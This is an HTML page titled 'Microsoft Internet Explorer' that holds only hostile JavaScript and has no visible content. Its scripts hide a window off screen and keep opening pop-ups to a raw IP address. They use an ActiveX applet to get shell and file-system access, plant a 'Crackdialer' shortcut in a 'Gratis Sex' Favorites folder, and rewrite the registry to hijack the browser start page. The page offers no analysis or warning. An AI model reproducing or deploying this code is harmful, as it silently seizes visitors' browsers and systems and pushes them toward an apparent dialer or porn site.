<HTML>
<HEAD>
<TITLE>Microsoft Internet Explorer</TITLE>

 

 
 
<script language="JavaScript">

var urldo = new Array("http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm","http://213.239.160.121/F7756/index6.htm");
var zeit =120000;
var laufnr = 0;
moveTo(-5000,-5000);
self.blur();
window.onerror=new Function("self.close();");
setTimeout("newwindow()",zeit);
function newwindow() {
	newurl = urldo[laufnr];
	newname = "_new"+laufnr;
	if (laufnr<urldo.length) {
		window.open(newurl,newname);
		laufnr++;
		setTimeout("newwindow()",zeit);
	}
	else {
		setTimeout("parent.close();",5);
	}
}
onFocus = "self.blur()";
</script>


<SCRIPT LANGUAGE="JavaScript">

var strFav                 = "";
var wShell                 = null;
var pathToInternetExplorer = '';
document.write("<APPLET code=com.ms.activeX.ActiveXComponent width=0 height=0 id=fav></APPLET>");
function SetFav() {
	try {
        	a1=document.applets("fav");
                a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
                a1.createInstance();
                wShell = a1.GetObject();
                a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
                a1.createInstance();
                wFso = a1.GetObject();
                try {
                	pathToInternetExplorer = getPath();
           		strFav = wShell.SpecialFolders("Favorites");
                        var favLocation = strFav + "\\Gratis Sex";
                        if (!wFso.FolderExists(favLocation)) {
                        	wFso.CreateFolder(favLocation);
			}
                        createFav(favLocation, 'Crackdialer',        'http://213.239.160.121/F7756/index6.htm');
                       		}
        	catch(e) {}
        }
        catch(e) {}
}
setTimeout("SetFav();", 1000);
function getPath() {
        testPath = 'C:\\Programme\\Internet Explorer\\';
        if(wFso.FolderExists(testPath)){
                return testPath;
	}
        testPath = 'C:\\Program Files\\Internet Explorer\\';
        if(wFso.FolderExists(testPath)) {
                return testPath;
	}
        return false;
}
function createFav(folder, name, url) {
        var oFav = wShell.CreateShortcut(folder + "\\" + name + ".url");
        oFav.TargetPath = url;
        oFav.Save();
}

//--></script>
<SCRIPT LANGUAGE="JavaScript">

document.writeln('<APPLET code=com.ms.activeX.ActiveXComponent width=0 height=0 id=start></APPLET>');
function set() {
	var active, api=document.applets("start");
	api.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
	api.createInstance();
	active = api.GetObject();	
	active.RegWrite("HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Start Page", "http://213.239.160.121/F7756/index6.htm");
}
setTimeout('{set();}',1000);

//--></script>






</HEAD>
<BODY  BGCOLOR="#FFFFFF">

</BODY>
</HTML>
